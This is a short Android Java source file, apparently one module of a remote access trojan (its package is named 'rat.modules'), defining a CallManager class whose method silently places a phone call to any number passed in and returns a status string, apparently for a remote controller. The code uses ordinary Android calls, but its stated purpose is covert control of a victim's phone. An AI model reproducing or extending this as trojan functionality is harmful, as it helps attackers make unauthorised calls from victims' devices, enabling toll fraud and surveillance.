package com.xroomjx.rat.modules;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class CallManager {
    public static String call(Context context, String number) {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return "calling";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }
}
